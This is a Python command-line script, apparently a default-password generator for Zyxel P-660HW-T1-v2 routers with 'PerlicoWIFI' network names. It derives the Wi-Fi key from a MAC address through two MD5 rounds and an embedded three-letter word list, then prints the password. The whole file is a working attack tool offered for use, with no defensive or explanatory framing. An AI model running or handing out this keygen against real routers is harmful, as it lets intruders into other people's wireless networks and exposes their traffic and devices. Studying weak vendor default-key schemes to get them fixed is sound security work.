# Default ESSID is PerlicoWIFI-XXXXX
# Zyxel P-660HW-T1-v2 using lower case mac

import hashlib
import argparse

def p660hw_t1_v2(mac, pwd_length):

	three_letter_words= 'agnahaakeaksalmaltalvandanearmaskaspattbagbakbiebilbitblableblib'\
			'lyboabodbokbolbomborbrabrobrubudbuedaldamdegderdetdindisdraduedu'\
			'kdundypeggeieeikelgelvemueneengennertesseteettfeifemfilfinflofly'\
			'forfotfrafrifusfyrgengirglagregrogrygulhaihamhanhavheihelherhith'\
			'ivhoshovhuehukhunhushvaideildileinnionisejagjegjetjodjusjuvkaika'\
			'mkankarkleklikloknaknekokkorkrokrykulkunkurladlaglamlavletlimlin'\
			'livlomloslovluelunlurlutlydlynlyrlysmaimalmatmedmegmelmenmermilm'\
			'inmotmurmyemykmyrnamnednesnoknyenysoboobsoddodeoppordormoseospos'\
			'sostovnpaiparpekpenpepperpippopradrakramrarrasremrenrevrikrimrir'\
			'risrivromroprorrosrovrursagsaksalsausegseiselsensessilsinsivsjus'\
			'jyskiskoskysmisnesnusolsomsotspastistosumsussydsylsynsyvtaktalta'\
			'mtautidtietiltjatogtomtretuetunturukeullulvungurourtutevarvedveg'\
			'veivelvevvidvikvisvriyreyte'

	# First MD5 digest
	digest1 = hashlib.md5()
	digest1.update(mac.lower().encode())
	total = sum(digest1.digest())

	three_letter_pos = total % 265
	three_letter_word = three_letter_words[three_letter_pos * 3:(three_letter_pos + 1) * 3]

	# Alteration of digest1 and junk
	p = three_letter_word
	s1 = list(digest1.digest())
	s2 = bytearray([s1[0], ord(p[0])] + s1[1:3] + [ord(p[1])] + s1[3:6] + [ord(p[2])] + s1[6:16])

	# Second MD5 digest and final password
	digest2 = hashlib.md5()
	digest2.update(s2)
	hex_digest2 = digest2.hexdigest()
	password = hex_digest2[16:16 + pwd_length]
	print(password)

parser = argparse.ArgumentParser(description='Keygen for Zyxel P-660HW-T1-v2 using lower case mac')
parser.add_argument('mac', help='Mac Address')
parser.add_argument('-length', help='Password length', default=12, type=int)
args = parser.parse_args()

p660hw_t1_v2(args.mac, args.length)
